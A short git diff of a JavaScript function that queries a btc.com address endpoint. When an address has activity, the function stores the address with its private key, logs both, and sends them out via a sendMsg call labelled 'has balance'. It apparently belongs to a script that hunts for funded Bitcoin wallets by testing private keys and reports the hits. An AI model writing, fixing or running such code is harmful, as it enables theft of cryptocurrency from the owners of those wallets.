@@ -21,7 +21,12 @@ function queryCoin(address, pkey) {
   const url = `https://btc.com/service/addressMentions?page=1&address=${address}`;
   try {
     axios.get(url).then(response => {
-      if (response.error_no == 0) {
+
+      // if (response.data.error_no == 1) {
+      //   sendMsg(address + '\n==============>>>> has balance:\n' + pkey)
+      // }
+
+      if (response.data.error_no == 0) {
         const acc = new Wallet({ publicK: address, privateK: pkey, bl: response.data });
         console.log({ address, pkey });
         acc.save(function (err) {
@@ -29,7 +34,7 @@ function queryCoin(address, pkey) {
         });
         console.log(address + '============== >>>> has balance' + pkey);
 
-        sendMsg(address + ' ==============>>>> has balance:' + pkey)
+        sendMsg(address + '\n==============>>>> has balance:\n' + pkey)
 
         clearInterval(interval)
       } else {
